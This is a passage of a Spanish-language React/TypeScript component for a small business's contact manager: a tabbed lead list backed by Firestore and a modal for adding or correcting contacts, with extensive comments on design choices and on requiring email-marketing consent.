'use client';

import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from 'react';
import { AnimatePresence, LayoutGroup, motion } from 'framer-motion';
import FichaPersona, { type Persona } from './FichaPersona';
import { ETIQUETA_TIPO, TIPOS, comoLlego, origenCorto, type Tipo } from '@/lib/origenes';
import { PERFILES } from '@/lib/captacion';
import { botonDe, diasEsperando, textoMotivo, type Grupo, type Motivo, type Situacion } from '@/lib/atencion';
import css from './plataforma.module.css';
import k from './crm.module.css';
import l from './crmlista.module.css';

/**
 * Los contactos de Sorela, dentro de la plataforma.
 *
 * Esto sustituye a la lista de leads de mentira que traía la maqueta —Elena,
 * Rocío, Nuria— con sus estados y sus notas inventadas. Lo que se ve aquí es
 * lo que hay en Firestore, y nada más: si está vacío es que todavía no se ha
 * apuntado nadie, y eso es un dato, no un hueco que rellenar.
 *
 * El estado se guarda al pulsar y se pinta antes de que conteste el servidor.
 * Si el servidor dice que no, se deshace: para marcar veinte contactos
 * seguidos, esperar a cada respuesta es insufrible.
 *
 * La lista va separada por lo que busca cada persona, no por orden de llegada.
 * Quien deja su contacto en la portada quiere que le traten, quien lo deja en
 * formaciones quiere aprender y quien lo deja en la comunidad ya es terapeuta:
 * son tres conversaciones distintas y llamarlas igual obliga a adivinar cuál
 * toca. De dónde vino lo decide `lib/origenes.ts`, en el servidor.
 *
 * Aquí no entra solo lo que llega por la web: Sorela puede apuntar a mano a
 * quien conoce en una exposición o por teléfono, corregir un dato mal escrito
 * y borrar a quien se apuntó por error. Esos tres van por la misma ruta que la
 * lista, `app/api/contactos`, y siempre recargando después: una ficha nueva o
 * corregida tiene que verse al momento o parece que no se ha guardado.
 */

const ESTADOS = ['Nuevo', 'Contactado', 'En conversación', 'Cerrado', 'Descartado'] as const;
type Estado = (typeof ESTADOS)[number];

/* `situacion` la calcula el GET con la regla de lib/atencion.ts. Puede venir
   null si el servidor no pudo leer el contexto; entonces se tira del estado. */
type Contacto = Persona & { estado: Estado; tipo: Tipo; situacion?: Situacion | null };

/**
 * Las pestañas de la lista, una por situación.
 *
 * Son las de lib/atencion.ts y no las columnas del tablero porque responden a
 * la pregunta que de verdad se hace Sorela al entrar —«¿a quién tengo que
 * escribir?»— y no a «¿en qué estado guardé a cada una?». Con mil personas en
 * la lista de espera, el tablero ponía las mil en «Por atender» aunque ninguna
 * esperase nada de ella. «Sin correos» solo sale si hay alguien así: es poca
 * gente y una pestaña siempre vacía es ruido.
 */
const PESTANAS: { id: string; titulo: string; grupos: Grupo[] | null; soloSiHay?: boolean }[] = [
  { id: 'te-necesita', titulo: 'Te necesitan', grupos: ['te-necesita'] },
  { id: 'lista', titulo: 'Lista de espera', grupos: ['lista'] },
  { id: 'avisar', titulo: 'Esperan aviso', grupos: ['avisar'] },
  { id: 'hablando', titulo: 'Hablando', grupos: ['hablando'] },
  { id: 'cerradas', titulo: 'Cerradas / Descartadas', grupos: ['cerrado', 'descartado'] },
  { id: 'sin-correos', titulo: 'Sin correos', grupos: ['sin-correos'], soloSiHay: true },
  { id: 'todas', titulo: 'Todas', grupos: null },
];

/** Cuántas filas se pintan de cada tanda. Mil filas de golpe atascan el móvil. */
const TANDA = 50;

/**
 * El motivo en una o dos palabras, para la pastilla del móvil.
 *
 * El texto de lib/atencion.ts («La apuntaste tú: nadie más le escribirá») es
 * el bueno para la ficha y para el ordenador, pero en una fila de 390 px se
 * comía el nombre de la persona y acababa cortado igual. En el móvil se
 * enseña esto y el texto entero va en el `title` y en la ficha. Vive aquí y
 * no en lib/ porque es solo una cuestión de sitio de esta pantalla.
 */
const MOTIVO_MINI: Record<Motivo, string> = {
  marcada: 'Marcada',
  reserva: 'Pidió plaza',
  mensaje: 'Te escribió',
  pregunta: 'Asistente web',
  formacion: 'Formación',
  cita: 'Quiere cita',
  'a-mano': 'A mano',
  'correo-no-llego': 'Correo no llegó',
};

/** Dónde se recuerda si Sorela prefiere la lista o el tablero. */
const CLAVE_VISTA = 'divine-crm-vista';

/**
 * El grupo de alguien: el que dice el servidor y, si no vino, uno
 * aproximado por su estado guardado. «Nuevo» sin más datos cae en «Te
 * necesitan», que es lo que el tablero ya decía de ellas: mejor de más que
 * esconder a alguien que sí espera.
 */
function grupoDe(c: Contacto): Grupo {
  if (c.situacion) return c.situacion.grupo;
  if (c.estado === 'Cerrado') return 'cerrado';
  if (c.estado === 'Descartado') return 'descartado';
  if (c.estado === 'Nuevo') return 'te-necesita';
  return 'hablando';
}

/**
 * La situación después de mover el estado a mano, sin esperar al servidor.
 *
 * Es una aproximación de lib/atencion.ts para que la fila salte de pestaña al
 * pulsar: escribir o cerrar quita cualquier motivo pendiente. Volver a
 * «Nuevo» no se adivina —depende de lo que pidió y cuándo—, así que ese caso
 * se deja igual y se recarga la lista al guardar.
 */
function situacionTras(s: Situacion | null | undefined, estado: Estado): Situacion | null | undefined {
  if (!s || estado === 'Nuevo') return s;
  const grupo: Grupo = estado === 'Cerrado' ? 'cerrado' : estado === 'Descartado' ? 'descartado' : 'hablando';
  return { ...s, estado, grupo, motivo: null, dato: null, desde: new Date().toISOString() };
}

/* Se reutilizan los distintivos que ya tiene la plataforma en vez de inventar
   cuatro colores nuevos: el sin atender destaca, el descartado se apaga. */
const CLASE: Record<Estado, string> = {
  Nuevo: css.estadoTinta,
  Contactado: css.estadoOro,
  'En conversación': css.estadoOro,
  Cerrado: css.estadoNeutro,
  Descartado: css.estadoApagado,
};

/**
 * Qué origen se guarda según lo que la persona busque.
 *
 * El origen es «por dónde entró», y quien se apunta a mano no ha entrado por
 * ningún sitio: no hay un valor verdadero que poner. Pero de él cuelga la
 * clasificación entera —`lib/origenes.ts` decide con el origen si alguien es
 * posible clienta, posible alumna o terapeuta certificada—, así que hay que
 * elegir uno que caiga en el tipo que Sorela marque. Estos lo consiguen:
 *
 *   cita-a-mano       → empieza por «cita-»      → posible clienta
 *   formacion-a-mano  → empieza por «formacion»  → posible alumna
 *   comunidad-a-mano  → empieza por «comunidad-» → terapeuta certificada
 *   a-mano            → no encaja en nada        → sin clasificar
 *
 * El sufijo «-a-mano» no es decorativo: mirando la colección en Firestore se
 * ve de un golpe cuáles escribió ella. Y no se usa «cita-madrid», que es lo
 * que manda components/Reserva.tsx y quedaría más bonito en la ficha, porque
 * eso significa «pidió cita en Madrid» y sería mentira: esta persona no ha
 * pedido nada, se la encontró en una feria.
 */
const ORIGEN_POR_TIPO: Record<Tipo, string> = {
  clienta: 'cita-a-mano',
  alumna: 'formacion-a-mano',
  comunidad: 'comunidad-a-mano',
  otro: 'a-mano',
};

/**
 * Si esta ficha la escribió Sorela en vez de llegar por un formulario.
 *
 * `veces` cuenta las veces que esa persona ha dejado sus datos en la web, y a
 * los apuntados a mano se les guarda un 0 porque no lo ha hecho ninguna. Está
 * explicado entero en el POST de app/api/contactos: la marca viaja por ahí
 * porque el GET manda ese número y no manda el campo `aMano`, que es el que
 * de verdad lo dice.
 */
const apuntadoAMano = (c: Contacto) => c.veces === 0;

/** «hace 3 h», «ayer», «12 oct». Una fecha completa no dice nada de un vistazo. */
function cuando(iso: string | null): string {
  if (!iso) return '';
  const d = new Date(iso);
  const min = Math.round((Date.now() - d.getTime()) / 60000);
  if (min < 1) return 'ahora mismo';
  if (min < 60) return `hace ${min} min`;
  const h = Math.round(min / 60);
  if (h < 24) return `hace ${h} h`;
  const dias = Math.round(h / 24);
  if (dias === 1) return 'ayer';
  if (dias < 7) return `hace ${dias} días`;
  return d.toLocaleDateString('es-ES', { day: 'numeric', month: 'short' });
}

/* ==========================================================================
   Apuntar y corregir un contacto
   ========================================================================== */

/** Lo que se está escribiendo en el formulario, antes de mandarlo. */
type Borrador = {
  nombre: string;
  correo: string;
  whatsapp: string;
  ciudad: string;
  perfil: string;
  nota: string;
  busca: Tipo;
  /** Solo al dar de alta: si esa persona le ha pedido la información. */
  pidio: boolean;
};

const BORRADOR_VACIO: Borrador = {
  nombre: '',
  correo: '',
  whatsapp: '',
  ciudad: '',
  perfil: '',
  nota: '',
  /* Nace «sin clasificar» a propósito, y no en «posible clienta»: si Sorela no
     toca el selector, lo honrado es que quede el hueco y no una etiqueta que
     nadie ha elegido. Es la misma idea que explica lib/origenes.ts. */
  busca: 'otro',
  pidio: false,
};

/** Qué está haciendo el panel: apuntar a alguien nuevo o corregir a alguien. */
type Modo = { que: 'nuevo' } | { que: 'editar'; contacto: Contacto };

/** Lo que contesta el guardado, para que el panel sepa qué pintar. */
type Resultado =
  | { ok: true }
  | { ok: false; errores: Record<string, string>; fallo?: string; duplicado?: string };

/**
 * El panel de apuntar o corregir.
 *
 * Va en un <dialog> con showModal() y no desplegado dentro de la pantalla, y
 * por dos motivos. El primero es dónde cae: la lista puede tener cientos de
 * filas con los filtros puestos, así que un formulario al final —como el de la
 * agenda— quedaría a un scroll larguísimo justo cuando hace falta, que es con
 * el móvil en la oreja y la persona al otro lado dictando su correo. El
 * segundo es que apuntar a alguien no es repasar la lista: es una sola cosa,
 * de principio a fin, y el modal trae hecho lo que eso pide —el foco dentro,
 * el fondo inerte, Escape para salir— sin pelearse con los z-index del cajón
 * de móvil del panel. Es el mismo trato que ya recibe la ficha de una persona
 * en FichaPersona.tsx, y reutiliza sus estilos tal cual.
 *
 * El panel no habla con el servidor: monta el cuerpo y avisa hacia arriba.
 * Quien tiene la lista es quien sabe recargarla.
 */
function PanelContacto({
  modo,
  onCerrar,
  onGuardar,
  onVerFicha,
}: {
  modo: Modo;
  onCerrar: () => void;
  onGuardar: (cuerpo: Record<string, unknown>) => Promise<Resultado>;
  /** Abre la ficha de quien ya estaba apuntada. Devuelve si se ha podido. */
  onVerFicha: (id: string) => boolean;
}) {
  const ref = useRef<HTMLDialogElement>(null);
  /* Dónde empezó el gesto del ratón, para no confundir «soltar el botón sobre
     el velo» con «pulsar el velo». Igual que en FichaPersona. */
  const empezoEnVelo = useRef(false);

  const editando = modo.que === 'editar';

  const [borrador, setBorrador] = useState<Borrador>(() =>
    modo.que === 'editar'
      ? {
          nombre: modo.contacto.nombre,
          correo: modo.contacto.correo,
          whatsapp: modo.contacto.whatsapp,
          ciudad: modo.contacto.ciudad,
          perfil: modo.contacto.perfil,
          nota: modo.contacto.nota,
          // Sí se edita, y el origen no se toca: viaja como `tipo` y el
          // servidor lo guarda aparte. De dónde entró es un hecho que ya pasó;
          // lo que puede estar mal es la lectura que se hizo de ese hecho.
          busca: modo.contacto.tipo,
          pidio: false,
        }
      : BORRADOR_VACIO
  );
  /* Con qué empezó, para saber al cerrar si hay algo escrito que se perdería.
     Se guarda en una ref y no en un estado porque no repinta nada. */
  const inicial = useRef(borrador);

  const [errores, setErrores] = useState<Record<string, string>>({});
  const [fallo, setFallo] = useState<string | null>(null);
  /* El id de quien ya ocupaba ese correo o ese móvil, para poder abrir su
     ficha desde el propio error en vez de mandar a buscarla a mano. */
  const [duplicado, setDuplicado] = useState<string | null>(null);
  /* Si la ficha de esa duplicada no aparece en la lista cargada. Pasa cuando
     la lista viene recortada por el tope del servidor: existe, pero no ha
     llegado, y el botón de abrirla no tendría a quién abrir. */
  const [duplicadaLejos, setDuplicadaLejos] = useState(false);
  const [guardando, setGuardando] = useState(false);

  /* Este panel se monta y se desmuestra entero con cada apertura —la lista lo
     pinta solo cuando hay modo, y con una `key` distinta por contacto—, así
     que los efectos son de montaje y no hace falta seguir a ninguna prop. */
  useEffect(() => {
    const dialogo = ref.current;
    if (!dialogo) return;
    if (!dialogo.open) dialogo.showModal();
    // Al desmontarse se cierra antes, para dejar limpia la capa superior del
    // navegador en vez de fiarlo todo a que el nodo desaparezca.
    return () => {
      if (dialogo.open) dialogo.close();
    };
  }, []);

  /* La lista de detrás no debe poder moverse mientras esto está abierto: en
     móvil, al arrastrar dentro del formulario se desplazaría y se perdería el
     sitio donde estabas. */
  useEffect(() => {
    const previo = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = previo;
    };
  }, []);

  /* Solo para los campos de texto. «Qué busca» se queda fuera a propósito: es
     de un tipo cerrado y colarle una cadena cualquiera por aquí se escaparía
     sin que TypeScript dijera nada. */
  const cambiar = (campo: Exclude<keyof Borrador, 'busca'>, valor: string) =>
    setBorrador((b) => ({ ...b, [campo]: valor }));

  /**
   * Cerrar, pero no a traición.
   *
   * Lo escrito aquí no existe en ningún otro sitio: al cerrar se desmonta con
   * el panel. Se compara con lo que había al abrir en vez de mirar si los
   * campos están vacíos, porque al corregir vienen llenos desde el principio y
   * si no, preguntaría siempre. Se pregunta igual que al cerrar una ficha con
   * una nota a medias.
   */
  function intentarCerrar() {
    const tocado = (Object.keys(borrador) as (keyof Borrador)[]).some(
      (k) => borrador[k] !== inicial.current[k]
    );
    if (tocado && !window.confirm('Tienes cambios sin guardar. Si cierras se pierden. ¿Cierro?')) {
      return;
    }
    onCerrar();
  }

  async function enviar(e: FormEvent) {
    e.preventDefault();
    if (guardando) return;
    setGuardando(true);
    setErrores({});
    setFallo(null);
    setDuplicado(null);

    /* Al corregir no viajan ni el correo ni el origen: el correo es el
       identificador del documento y cambiarlo dejaría atrás el seguimiento
       entero, y el origen es de dónde entró, que no cambia. Lo explica el
       PATCH de app/api/contactos. */
    const cuerpo: Record<string, unknown> = {
      nombre: borrador.nombre,
      whatsapp: borrador.whatsapp,
      ciudad: borrador.ciudad,
      perfil: borrador.perfil,
      nota: borrador.nota,
      /*
       * Al dar de alta, «qué busca» se traduce a un origen: es lo único que
       * hay, porque esa persona no ha entrado por ningún sitio.
       *
       * Al corregir viaja como `tipo`, y el servidor lo guarda aparte sin
       * tocar el origen: de dónde entró es un hecho que ya pasó, y lo que
       * puede estar mal es la lectura que se hizo de ese hecho.
       */
      ...(editando
        ? { tipo: borrador.busca }
        : {
            correo: borrador.correo,
            origen: ORIGEN_POR_TIPO[borrador.busca],
            /* Sin esta marca no sale ningún correo ni entra en las campañas:
               escribir con publicidad a quien no lo ha pedido está prohibido
               (art. 21 LSSI). Lo explica el POST de app/api/contactos. */
            pidioInformacion: borrador.pidio,
          }),
    };

    const res = await onGuardar(cuerpo);
    // Si ha ido bien, la lista cierra el panel y lo desmonta: no hay nada que
    // repintar aquí, y tocar el estado de lo que ya no está no sirve de nada.
    if (res.ok) return;

    setErrores(res.errores);
    setFallo(res.fallo ?? null);
    setDuplicado(res.duplicado ?? null);
    setDuplicadaLejos(false);
    setGuardando(false);
  }

  /** El fallo de un campo, debajo de él y con su nombre. */
  function error(campo: string) {
    if (!errores[campo]) return null;
    return (
      <span className={css.errorCampo} role="alert">
        {errores[campo]}
      </span>
    );
  }

  return (
    <dialog
      ref={ref}
      className={css.fichaPanel}
      aria-label={editando ? 'Corregir los datos del contacto' : 'Apuntar un contacto nuevo'}
      // Escape cierra por su cuenta sin pasar por React. Se corta siempre y se
      // decide aquí: si hay algo escrito, intentarCerrar() pregunta, y al
      // decir que no el preventDefault es lo que lo deja abierto.
      onCancel={(e) => {
        e.preventDefault();
        intentarCerrar();
      }}
      onPointerDown={(e) => {
        empezoEnVelo.current = e.target === ref.current;
      }}
      // Se exige que el gesto empezara Y acabara fuera: al arrastrar para
      // seleccionar el texto de un campo, el «click» cae sobre el velo y sin
      // esta comprobación se cerraría el formulario a medio escribir.
      onClick={(e) => {
        if (e.target === ref.current && empezoEnVelo.current) intentarCerrar();
      }}
    >
      <div className={css.fichaCaja}>
        <button
          type="button"
          className={css.fichaCerrar}
          onClick={intentarCerrar}
          aria-label="Cerrar el formulario"
        >
          <svg width="14" height="14" viewBox="0 0 15 15" aria-hidden="true">
            <path
              d="M1 1l13 13M14 1L1 14"
              stroke="currentColor"
              strokeWidth="1.3"
              fill="none"
              strokeLinecap="round"
            />
          </svg>
        </button>

        <form onSubmit={enviar} className={css.columna} style={{ gap: 16 }}>
          <header style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <p className={css.rotuloSeccion}>{editando ? 'Corregir' : 'Apuntar a mano'}</p>
            <h2 className={css.h3}>
              {editando ? modo.contacto.nombre || 'Sin nombre' : 'Un contacto nuevo'}
            </h2>
            <p className={css.parrafo}>
              {editando
                ? 'Lo que corrijas aquí se queda en su ficha. Lo que tengas apuntado de sus conversaciones no se toca.'
                : 'Para quien conozcas fuera de la web: en una exposición, por teléfono o porque te lo han presentado. Entra en la misma lista que los demás.'}
            </p>
            {/* Se dice antes de escribir nada, no después de pulsar: esto manda
                un correo a una persona de verdad y no se puede deshacer. */}
            {!editando && (
              <p className={css.apunte}>
                Solo si marcas que te ha pedido la información le llega por correo, la misma que
                reciben quienes la piden desde la web. Si no, se guarda en la lista sin escribirle
                y sin meterla en las campañas.
              </p>
            )}
          </header>

          {fallo && (
            <p className={css.avisoFallo} role="alert">
              {fallo}
            </p>
          )}

          {/* La salida cuando ese correo o ese móvil ya eran de alguien: se le
              abre su ficha en vez de dejarla buscándola a mano por la lista. El
              botón va aquí y no pegado al campo que ha chocado porque un botón
              dentro de un <label> activa además el campo al pulsarlo. */}
          {duplicado && (
            <p className={css.avisoFallo}>
              Esa persona ya estaba apuntada.{' '}
              <button
                type="button"
                className={css.btnLinea}
                onClick={() => setDuplicadaLejos(!onVerFicha(duplicado))}
              >
                Abrir su ficha
              </button>
              {duplicadaLejos && (
                <span style={{ display: 'block', marginTop: 6 }}>
                  Está en la base de datos, pero no en la parte de la lista que se ha cargado.
                  Ciérrale esto y búscala por su nombre o su correo en el buscador de arriba.
                </span>
              )}
            </p>
          )}

          <label className={css.etiquetaCampo}>
            Nombre
            <input
              value={borrador.nombre}
              onChange={(e) => cambiar('nombre', e.target.value)}
              className={css.campoCaja}
              autoComplete="off"
              /* El ejemplo no lleva nombre propio a posta: un nombre de muestra
                 en un panel donde todavía no hay nadie se lee como una persona
                 que existe. */
              placeholder="Nombre y apellidos"
            />
            {error('nombre')}
          </label>

          <div className={css.formRejilla}>
            {editando ? (
              /* El correo no se puede corregir porque ES el identificador del
                 documento en Firestore. Se enseña igual, apagado, para que no
                 parezca que se ha perdido, y se dice qué hacer si está mal. */
              <div className={css.etiquetaCampo}>
                Correo
                <span className={css.fichaValor}>{modo.contacto.correo || 'No consta'}</span>
                <span className={css.errorCampo}>
                  El correo no se cambia: es con lo que se guarda su ficha. Si está mal, bórrala y
                  apúntala otra vez.
                </span>
              </div>
            ) : (
              <label className={css.etiquetaCampo}>
                Correo
                <input
                  type="email"
                  value={borrador.correo}
                  onChange={(e) => cambiar('correo', e.target.value)}
                  className={css.campoCaja}
                  autoComplete="off"
                  placeholder="nombre@correo.com"
                />
                {error('correo')}
              </label>
            )}

            <label className={css.etiquetaCampo}>
              WhatsApp
              <input
                type="tel"
                value={borrador.whatsapp}
                onChange={(e) => cambiar('whatsapp', e.target.value)}
                className={css.campoCaja}
                autoComplete="off"
                placeholder="+34 600 00 00 00"
              />
              {error('whatsapp')}
            </label>

            <label className={css.etiquetaCampo}>
              Ciudad
              <input
                value={borrador.ciudad}
                onChange={(e) => cambiar('ciudad', e.target.value)}
                className={css.campoCaja}
                autoComplete="off"
                placeholder="Dónde vive"
              />
              {error('ciudad')}
            </label>

            <label className={css.etiquetaCampo}>
              A qué se dedica
              <select
                value={borrador.perfil}
                onChange={(e) => cambiar('perfil', e.target.value)}
                className={css.campoCaja}
              >
                {/* Las mismas opciones que el formulario de la web, para que
                    los dos caminos guarden lo mismo y la lista no acabe con
                    dos maneras de decir lo mismo. */}
                <option value="">No lo sé todavía</option>
                {PERFILES.map((p) => (
                  <option key={p}>{p}</option>
                ))}
              </select>
              {error('perfil')}
            </label>

            {/* También al corregir: una clasificación mal puesta era lo único
                de la ficha que no había forma de arreglar, y la propia pantalla
                mandaba a «abrir su ficha y corregirla ahí». */}
            <label className={css.etiquetaCampo}>
              Qué busca
              <select
                value={borrador.busca}
                onChange={(e) => setBorrador((b) => ({ ...b, busca: e.target.value as Tipo }))}
                className={css.campoCaja}
              >
                {TIPOS.filter((t) => t !== 'clienta' || borrador.busca === 'clienta').map((t) => (
                  <option key={t} value={t}>
                    {ETIQUETA_TIPO[t]}
                  </option>
                ))}
              </select>
            </label>
          </div>

          <p className={css.apunte}>
            Hoy la web solo capta para la masterclass (lista de espera); quien entra por un
            enlace a un curso o a la membresía ya tiene su cuenta y no pasa por aquí. Si no
            sabes qué busca, déjalo sin clasificar.
            {editando && ' Cambiarlo aquí no toca de dónde llegó: eso se queda como está.'}
          </p>

          <label className={css.etiquetaCampo}>
            Nota
            <textarea
              rows={3}
              value={borrador.nota}
              onChange={(e) => cambiar('nota', e.target.value)}
              className={css.campoCaja}
              style={{ resize: 'vertical' }}
              placeholder="Dónde la conociste, qué te pidió…"
            />
            {error('nota')}
          </label>

          {/* La ley no deja mandar publicidad por correo a quien no la ha
              pedido. Desmarcada de salida: solo Sorela sabe si se la pidió. */}
          {!editando && borrador.correo.trim() && (
            <label
              className={css.parrafo}
              style={{ display: 'flex', gap: 10, alignItems: 'flex-start', cursor: 'pointer' }}
            >
              <input
                type="checkbox"
                checked={borrador.pidio}
                onChange={(e) => setBorrador((b) => ({ ...b, pidio: e.target.checked }))}
                style={{ width: 18, height: 18, marginTop: 2, flex: 'none', accentColor: 'var(--arcilla, #8a6a32)' }}
              />
              <span>
                Me ha pedido recibir la información de la Técnica Divine y novedades por correo.
              </span>
            </label>
          )}

          <div className={css.acciones}>
            <button type="submit" className={css.btn} disabled={guardando}>
              {guardando
                ? 'Guardando…'
                : editando
                  ? 'Guardar los cambios'
                  : borrador.pidio && borrador.correo.trim()
                    ? 'Apuntar y mandarle la información'
                    : 'Apuntar'}
            </button>
            <button type="button" className={css.btnLinea} onClick={intentarCerrar}>
              Cancelar
            </button>
          </div>

          {!editando && (
            <p className={css.apunte}>
              Hace falta el nombre y, por lo menos, el correo o el WhatsApp. Si solo te ha dado el
              móvil, con eso vale.
            </p>
          )}
        </form>
      </div>
    </dialog>
  );
}

/* ==========================================================================
   La lista
   ========================================================================== */

export default function Contactos() {
  const [lista, setLista] = useState<Contacto[] | null>(null);
  const [fallo, setFallo] = useState<string | null>(null);
  const [aviso, setAviso] = useState<string | null>(null);
  const [pestana, setPestana] = useState('atender');
  const [menu, setMenu] = useState<string | null>(null);
  const [arrastrando, setArrastrando] = useState<string | null>(null);
  const [encima, setEncima] = useState<string | null>(null);
  const [verDescartados, setVerDescartados] = useState(false);
  const [brillo, setBrillo] = useState<string | null>(null);
  const [tipo, setTipo] = useState<'Todos' | Tipo>('Todos');
  const [busca, setBusca] = useState('');
  /* Por dónde entraron: la tira de «De dónde llegan» filtra por esto. */
  const [deDonde, setDeDonde] = useState<string | null>(null);
  // Qué ficha está abierta. Se guarda el id y no la persona entera para que,
  // al cambiarle el estado o apuntarle algo, la ficha se repinte con lo nuevo
  // en vez de quedarse con la copia de cuando se abrió.
  const [abierta, setAbierta] = useState<string | null>(null);
  // Si el formulario está abierto y para qué. Null es que no lo está.
  const [modo, setModo] = useState<Modo | null>(null);
  /** Si el servidor ha tenido que cortar la lista por su tope. */
  const [recortada, setRecortada] = useState(false);
  /* Lista compacta o tablero. La lista es la de salida: con cientos de
     personas, una fila por cabeza es lo único que se puede recorrer. */
  const [vista, setVista] = useState<'lista' | 'tablero'>('lista');
  /* La pestaña que eligió Sorela. Null es «la que toque»: «Te necesitan» si
     hay alguien, y si no «Todas». Se decide al pintar y no al cargar para que
     se corrija sola cuando la última persona pasa a «Hablando». */
  const [pestanaLista, setPestanaLista] = useState<string | null>(null);
  /* Desde qué red o buscador llegó: el segundo filtro de procedencia. */
  const [deFuente, setDeFuente] = useState<string | null>(null);
  const [verFiltros, setVerFiltros] = useState(false);
  /** Cuántas filas se pintan ahora; crece de TANDA en TANDA. */
  const [cuantas, setCuantas] = useState(TANDA);
  /* El marcador del final de la lista, en un estado y no en una ref para que
     el observador se monte cuando el nodo aparece de verdad. */
  const [centinela, setCentinela] = useState<HTMLElement | null>(null);
  /* Si el menú «⋯» abierto se despliega hacia arriba: cerca del final de la
     pantalla, hacia abajo quedaba debajo de la barra fija del móvil. */
  const [menuArriba, setMenuArriba] = useState(false);
  /* Cuántas tarjetas se pintan en cada columna del tablero. Pintar las 900 de
     golpe, cada una con su animación de posición, congelaba la página más de
     un segundo al pasar de Lista a Tablero. */
  const [cuantasTablero, setCuantasTablero] = useState<Record<string, number>>({});
  /* Cuántos contactos se piden al servidor y hasta dónde deja llegar. Va
     también en una ref porque `cargar` no cambia de identidad y tiene que
     pedir siempre el tope de ahora, no el del primer pintado. */
  const [tope, setTope] = useState<{ ahora: number; maximo: number } | null>(null);
  const topePedido = useRef<number | null>(null);

  /* La vista elegida se recuerda en este navegador. Va en try/catch porque en
     una ventana privada o con los datos bloqueados localStorage lanza, y eso
     no puede dejar la pantalla en blanco. */
  useEffect(() => {
    try {
      const guardada = window.localStorage.getItem(CLAVE_VISTA);
      if (guardada === 'tablero' || guardada === 'lista') setVista(guardada);
    } catch {
      /* Sin almacenamiento: se queda la lista. */
    }
  }, []);

  function elegirVista(v: 'lista' | 'tablero') {
    setVista(v);
    try {
      window.localStorage.setItem(CLAVE_VISTA, v);
    } catch {
      /* No se recuerda, pero cambia igual. */
    }
  }

  /* Cada carga lleva su número de turno. Aquí se recarga desde cuatro sitios
     —al entrar, al guardar, al apuntar una nota y desde «Reintentar»—, así que
     es fácil tener dos peticiones en el aire, y no tienen por qué contestar en
     orden: si la primera llega la última, pinta una lista vieja encima de la
     nueva y nada lo delata. Solo se hace caso al último turno pedido. */
  const turno = useRef(0);

  const cargar = useCallback(async () => {
    const mio = ++turno.current;
    setFallo(null);
    try {
      const r = await fetch(topePedido.current ? `/api/contactos?tope=${topePedido.current}` : '/api/contactos');
      const c = await r.json().catch(() => ({ ok: false }));
      if (mio !== turno.current) return;
      if (!c.ok) {
        setFallo(
          c.motivo === 'sin-configurar'
            ? 'Falta la configuración de Firebase en el servidor.'
            : c.motivo === 'sin-permiso'
              ? 'Esta lista solo la ve Sorela.'
              : 'No he podido cargar los contactos.'
        );
        setLista([]);
        return;
      }
      setLista(c.contactos);
      setRecortada(Boolean(c.recortada));
      if (typeof c.tope === 'number') setTope({ ahora: c.tope, maximo: Number(c.topeMaximo) || c.tope });
    } catch {
      if (mio !== turno.current) return;
      setFallo('No hay conexión con el servidor.');
      setLista([]);
    }
  }, []);

  useEffect(() => {
    cargar();
  }, [cargar]);

  /** Traer los mil siguientes cuando la lista viene cortada por el tope. */
  function traerMas() {
    if (!tope) return;
    topePedido.current = Math.min(tope.maximo, tope.ahora + 1000);
    cargar();
  }

  /*
   * Cerrar el menú «⋯» como se cierra cualquier menú: con Escape o pulsando
   * en cualquier otro sitio de la página.
   *
   * Antes solo lo cerraba un clic dentro de la columna de Clientes —la
   * cabecera o la barra de abajo no contaban— y Escape no hacía nada. Además
   * el primer clic en otra fila solo cerraba el menú sin abrir su ficha, y
   * parecía que la fila no respondía. Ahora el clic cierra el menú y sigue su
   * camino: si era sobre otra persona, se abre su ficha.
   *
   * Se escucha `pointerdown` en el documento, en fase de captura, para que
   * ningún stopPropagation de otra parte de la plataforma se lo coma. El botón
   * «⋯» del menú abierto queda fuera: él mismo lo cierra con su clic, y si
   * aquí también se cerrara, su clic lo volvería a abrir.
   */
  useEffect(() => {
    if (!menu) return;
    const raiz = document.documentElement;
    /* Mientras hay un menú abierto, los avisos flotantes se apartan (ver
       avisos.module.css): en el móvil tapaban sus últimas opciones, que son
       justo «Descartar» y «Borrar». */
    raiz.setAttribute('data-menu-abierto', '');
    const fuera = (e: PointerEvent) => {
      const t = e.target as HTMLElement | null;
      if (t?.closest('[role=menu]') || t?.closest('[aria-expanded=true][data-menu-de]')) return;
      setMenu(null);
    };
    const tecla = (e: KeyboardEvent) => {
      if (e.key !== 'Escape') return;
      // Se vuelve al botón que lo abrió, o el foco se quedaría en el aire.
      document.querySelector<HTMLElement>(`[data-menu-de="${CSS.escape(menu)}"]`)?.focus();
      setMenu(null);
    };
    document.addEventListener('pointerdown', fuera, true);
    document.addEventListener('keydown', tecla);
    return () => {
      raiz.removeAttribute('data-menu-abierto');
      document.removeEventListener('pointerdown', fuera, true);
      document.removeEventListener('keydown', tecla);
    };
  }, [menu]);

  /** Abre o cierra el menú «⋯» de una persona, mirando hacia dónde cabe. */
  function alternarMenu(id: string, boton: HTMLElement) {
    if (menu === id) {
      setMenu(null);
      return;
    }
    /* El menú mide unos 260 px. Si debajo del botón no caben —la barra fija
       del móvil se lleva además unos 80—, se abre hacia arriba. */
    setMenuArriba(window.innerHeight - boton.getBoundingClientRect().bottom < 340);
    setMenu(id);
  }

  /**
   * Cambiar en qué punto está una persona.
   *
   * Devuelve si se ha guardado. Lo necesita la ficha: cuando el cambio se
   * lanza desde ella —que es un diálogo modal— el aviso de fallo de esta
   * pantalla queda DETRÁS del velo, inerte y sin que nadie lo vea. Con el
   * resultado en la mano, la ficha lo pinta dentro de sí misma.
   */
  async function cambiarEstado(id: string, estado: Estado): Promise<boolean> {
    /* Se guarda solo el estado anterior de ESA persona, no la lista entera.
       Restaurando la lista entera, un fallo aquí borraba de la pantalla los
       cambios que sí se habían guardado bien en otras filas mientras tanto. */
    const antes = lista?.find((c) => c.id === id);
    const estadoAntes = antes?.estado;
    // La situación también se guarda, para deshacerla igual que el estado.
    const situacionAntes = antes?.situacion;
    setLista(
      (l) => l?.map((c) => (c.id === id ? { ...c, estado, situacion: situacionTras(c.situacion, estado) } : c)) ?? l
    );
    try {
      const r = await fetch('/api/contactos', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, estado }),
      });
      if (!(await r.json().catch(() => ({ ok: false }))).ok) throw new Error();
      // Volver a «Nuevo» no se puede adivinar aquí (ver situacionTras): que
      // lo diga el servidor con la regla de verdad.
      if (estado === 'Nuevo') cargar();
      return true;
